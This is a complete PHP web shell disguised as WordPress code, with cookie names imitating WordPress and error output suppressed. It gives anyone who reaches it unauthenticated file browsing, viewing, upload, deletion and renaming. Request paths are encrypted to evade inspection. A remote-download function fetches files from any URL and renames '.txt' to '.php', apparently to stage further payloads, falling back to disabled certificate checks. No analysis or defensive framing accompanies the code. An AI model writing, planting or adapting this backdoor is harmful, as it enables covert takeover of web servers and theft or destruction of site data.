<?php
@error_reporting(E_ALL);
@ini_set('display_errors', 0);
function generateRandomKey($length = 16) {
	return bin2hex(random_bytes($length / 2));
}
if (isset($_COOKIE['wordpress_test_cookie']) && isset($_COOKIE['wordpress_loggeds']) && isset($_COOKIE['wp-settings-times'])) {
	$keyGeneratedTime = $_COOKIE['wp-settings-times'];
	if ((time() - $keyGeneratedTime) < 1800) {
		$encryptionKey = $_COOKIE['wordpress_test_cookie'];
		$encryptionIv = $_COOKIE['wordpress_loggeds'];
	} else {
		$encryptionKey = generateRandomKey(16);
		$encryptionIv = generateRandomKey(16);
		setcookie('wordpress_test_cookie', $encryptionKey, time() + 1800);
		setcookie('wordpress_loggeds', $encryptionIv, time() + 1800);
		setcookie('wp-settings-times', time(), time() + 1800);
	}
} else {
	$encryptionKey = generateRandomKey(16);
	$encryptionIv = generateRandomKey(16);
	setcookie('wordpress_test_cookie', $encryptionKey, time() + 1800);
	setcookie('wordpress_loggeds', $encryptionIv, time() + 1800);
	setcookie('wp-settings-times', time(), time() + 1800);
}
define('wordpress_test_cookie', $encryptionKey);
define('wordpress_loggeds', $encryptionIv);
function encrypt($data) {
	return bin2hex(openssl_encrypt($data, 'aes-128-cbc', wordpress_test_cookie, OPENSSL_RAW_DATA, wordpress_loggeds));
}
function decrypt($data) {
	return openssl_decrypt(hex2bin($data), 'aes-128-cbc', wordpress_test_cookie, OPENSSL_RAW_DATA, wordpress_loggeds);
}
$currentDir = isset($_POST['path']) ? decrypt($_POST['path']) : getcwd();
$currentDir = realpath($currentDir);
function listDirectory($dir) {
	$scan = scandir($dir);
	$files = array();
	$directories = array();
	foreach ($scan as $item) {
		if ($item != '.' && $item != '..') {
			if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
				$directories[] = $item;
			} else {
				$files[] = $item;
			}
		}
	}
	return array_merge($directories, $files);
}
function uploadFile($targetDir) {
	$targetPath = $targetDir . '/' . basename($_FILES['file_upload']['name']);
	if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetPath)) {
		return '<div class="success">File uploaded successfully.</div>';
	} else {
		return '<div class="error">File upload failed.</div>';
	}
}
function deleteFile($filePath) {
	if (unlink($filePath)) {
		return '<div class="success">File deleted successfully.</div>';
	} else {
		return '<div class="error">File deletion failed.</div>';
	}
}
function viewFile($filePath) {
	if (is_file($filePath)) {
		$handle = fopen($filePath, "r");
		$content = fread($handle, filesize($filePath));
		fclose($handle);
		return htmlspecialchars($content);
	} else {
		return 'File does not exist.';
	}
}
function renameItem($oldPath, $newName) {
	$newPath = dirname($oldPath) . '/' . $newName;
	if (rename($oldPath, $newPath)) {
		return '<div class="success">Item renamed successfully.</div>';
	} else {
		return '<div class="error">Renaming failed.</div>';
	}
}
function downloadRemoteFile($url, $targetDir) {
	$filen = str_replace('.txt','.php',basename($url));
	$targetPath = $targetDir . '/' . $filen;
	$file = fopen($url, 'rb');
	if ($file) {
		$targetFile = fopen($targetPath, 'wb');
		if ($targetFile) {
			while ($buffer = fread($file, 1024)) {
				fwrite($targetFile, $buffer);
			}
			fclose($targetFile);
			fclose($file);
			return '<div class="success">Remote file downloaded successfully using fopen().</div>';
		}
		fclose($file);
	}
	$fileContent = @file($url);
	if ($fileContent !== false) {
		$targetFile = fopen($targetPath, 'wb');
		if ($targetFile) {
			foreach ($fileContent as $line) {
				fwrite($targetFile, $line);
			}
			fclose($targetFile);
			return '<div class="success">Remote file downloaded successfully using file().</div>';
		}
	}
	if (@copy($url, $targetPath)) {
		return '<div class="success">Remote file downloaded successfully using copy().</div>';
	}
	$contextOptions = array(
	        "ssl" => array(
	            "verify_peer" => false,
	            "verify_peer_name" => false,
	        ),
	    );
	$context = stream_context_create($contextOptions);
	$file = fopen($url, 'rb', false, $context);
	if ($file) {
		$targetFile = fopen($targetPath, 'wb');
		if ($targetFile) {
			while ($buffer = fread($file, 1024)) {
				fwrite($targetFile, $buffer);
			}
			fclose($targetFile);
			fclose($file);
			return '<div class="success">Remote file downloaded successfully using stream_context_create().</div>';
		}
		fclose($file);
	}
	return '<div class="error">Remote file download failed.</div>';
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if (isset($_FILES['file_upload'])) {
		$message = uploadFile($currentDir);
	} elseif (isset($_POST['delete'])) {
		$message = deleteFile(decrypt($_POST['delete']));
	} elseif (isset($_POST['download_url'])) {
		$message = downloadRemoteFile(base64_decode($_POST['download_url']), $currentDir);
	} elseif (isset($_POST['old_name']) && isset($_POST['new_name'])) {
		$oldPath = decrypt($_POST['old_name']);
		$newName = base64_decode($_POST['new_name']);
		$message = renameItem($oldPath, $newName);
	}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<style>
body {
	font-family: Arial, sans-serif;
	margin: 0;
	padding: 20px;
}
.container {
	max-width: 800px;
	margin: 0 auto;
}
.success {
	color: #4CAF50;
}
.error {
	color: #f44336;
}
form {
	margin-bottom: 10px;
}
input[type="text"],
input[type="submit"] {
	padding: 5px;
	margin-right: 5px;
}
table {
	width: 100%;
	border-collapse: collapse;
	margin-bottom: 20px;
}
th, td {
	border: 1px solid #ddd;
	padding: 8px;
	text-align: left;
}
th {
	background-color: #f2f2f2;
}
.dir {
	color: blue;
}
.file {
	color: black;
}
pre {
	white-space: pre-wrap;
	word-wrap: break-word;
	margin: 0;
}
</style>
<script>
function encrypt(value) {
	return btoa(value);
}
</script>
</head>
<body>
<div class="container">
    <?php if (isset($message)) echo $message;
?>
    <form enctype="multipart/form-data" method="POST" action="">
        <input type="file" name="file_upload" />
        <input type="submit" value="Upload File" />
        <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt($currentDir)) ?>" />
    </form>
    <form method="POST" action="" onsubmit="document.getElementsByName('download_url')[0].value = encrypt(document.getElementsByName('download_url')[0].value)">
        <input type="text" name="download_url" placeholder="Enter remote file URL" />
        <input type="submit" value="Download Remote File" />
        <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt($currentDir)) ?>" />
    </form>
    <h2>Current Path: 
        <?php
        $pathParts = explode(DIRECTORY_SEPARATOR, trim($currentDir, DIRECTORY_SEPARATOR));
if (substr($currentDir, 0, 1) === '/') {
	$fullPath = DIRECTORY_SEPARATOR;
} else {
	$fullPath = '';
}
foreach ($pathParts as $index => $part) {
	if ($fullPath === '') {
		$fullPath = $part;
	} else if ($fullPath === DIRECTORY_SEPARATOR) {
		$fullPath .= $part;
	} else {
		$fullPath .= DIRECTORY_SEPARATOR . $part;
	}
	?>
	            <form method="POST" style="display:inline;">
	                <button type="submit" name="path" value="<?= htmlspecialchars(encrypt($fullPath)) ?>" style="background: none; border: none; padding: 0;"><?= htmlspecialchars($part) ?></button>
	            </form>
	            <?php
	            echo '/';
}
?>
    </h2>
    <?php if ($currentDir !== DIRECTORY_SEPARATOR): ?>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt(dirname($currentDir))) ?>" />
            <input type="submit" value="Go up one directory"/>
        </form>
    <?php endif;
?>
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Actions</th>
        </tr>
        <?php foreach (listDirectory($currentDir) as $file): ?>
            <?php $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
?>
            <tr>
                <td class="<?= is_dir($filePath) ? 'dir' : 'file' ?>">
                    <?php if (is_dir($filePath)): ?>
                        <form method="POST" style="display: inline;">
                            <button type="submit" name="path" value="<?= htmlspecialchars(encrypt($filePath)) ?>" style="background: none; border: none; padding: 0; color: blue;"><?= htmlspecialchars($file) ?></button>
                        </form>
                    <?php else: ?>
                        <form method="POST" style="display: inline;">
                            <button type="submit" name="view" value="<?= htmlspecialchars(encrypt($filePath)) ?>" style="background: none; border: none; padding: 0; color: black;"><?= htmlspecialchars($file) ?></button>
                            <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt($currentDir)) ?>" />
                        </form>
                    <?php endif;
?>
                </td>
                <td>
                    <?php if (is_file($filePath)): ?>
                        <?= filesize($filePath) ?> bytes
                    <?php else: ?>
                        DIR
                    <?php endif;
?>
                </td>
                <td>
                    <?php if (is_file($filePath)): ?>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="delete" value="<?= htmlspecialchars(encrypt($filePath)) ?>" />
                            <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt($currentDir)) ?>" />
                            <input type="submit" value="Delete"/>
                        </form>
                    <?php endif;
?>
                    <form method="POST" action="" style="display:inline;" onsubmit="this.new_name.value = encrypt(this.new_name.value)" >
                        <input type="hidden" name="old_name" value="<?= htmlspecialchars(encrypt($filePath)) ?>" />
                        <input type="text" name="new_name" value="<?= htmlspecialchars($file) ?>" />
                        <input type="hidden" name="path" value="<?= htmlspecialchars(encrypt($currentDir)) ?>" />
                        <input type="submit" value="Rename"/>
                    </form>
                </td>
            </tr>
        <?php endforeach;
?>
    </table>
    <?php if (isset($_POST['view'])): ?>
        <h2>Viewing File: <?= htmlspecialchars(basename(decrypt($_POST['view']))) ?></h2>
        <textarea rows="20" cols="80"><?= viewFile(decrypt($_POST['view'])) ?></textarea>
    <?php endif;
?>
</div>
</body>
</html>